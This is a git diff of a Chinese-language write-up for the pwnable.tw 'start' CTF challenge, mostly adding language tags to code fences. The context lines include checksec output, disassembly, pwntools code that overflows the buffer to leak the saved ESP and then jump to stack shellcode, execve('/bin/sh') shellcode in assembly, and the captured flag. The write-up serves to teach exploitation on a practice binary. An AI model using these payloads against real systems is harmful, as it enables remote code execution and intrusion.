@@ -17,7 +17,7 @@ categories: Pwn
 不得不说，[checksec](http://www.trapkit.de/tools/checksec.html)这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。
 最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上就可以了！
 
-```
+```shell
 $ checksec  ./start
     Arch:     i386-32-little
     RELRO:    No RELRO
@@ -32,7 +32,7 @@ $ checksec  ./start
 
 用IDA逆向分析，汇编代码
 
-```
+```c
 保存现场环境esp、_exit
 .text:08048060                 push    esp
 .text:08048061                 push    offset _exit
@@ -84,7 +84,7 @@ Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调�
 
 [关于系统调用的功能号](http://syscalls.kernelgrok.com/)：
 
-```
+```shell
 #define __NR_exit                 1
 #define __NR_fork                 2
 #define __NR_read                 3
@@ -180,7 +180,7 @@ Reference to pattern buffer not found in memory
 
 1. 泄露Saved ESP
 
-```
+```python
     start = p.recvuntil(':')  //等待write执行完毕
     payload = 'a'*0x14 + p32(0x08048087)   //发送溢出数据，覆盖ret为0x08048087->输出14h字节
     p.send(payload)
@@ -189,7 +189,7 @@ Reference to pattern buffer not found in memory
 
 debug过程：
 
-```
+```shell
 [DEBUG] Received 0x14 bytes:
     "Let's start the CTF:"
 [DEBUG] Sent 0x18 bytes:
@@ -206,7 +206,7 @@ debug过程：
 
 此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。
 
-```
+```python
     payload = 'a'*0x14 + p32(saved_esp + 20) + shellcode
     print p32(saved_esp)
     p.send(payload)
@@ -229,7 +229,7 @@ shellcode同样可以用系统调用的方式执行execve("/bin/sh",NULL,NULL)
 * 第三个参数，即 edx 应该为 0
 
 
-```
+```c
 xor eax,eax     //清空eax
 push eax        //0入栈，当作字符/bin/sh结尾
 push '/sh'
@@ -241,7 +241,7 @@ mov al, 0xb     //系统调用号
 int 80
 ```
 
-```
+```c
 shellcode='''
 xor eax,eax
 push eax
@@ -316,7 +316,6 @@ $ cat ./home/start/flag
 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
 ```
 
-##
 
 ## REF
 
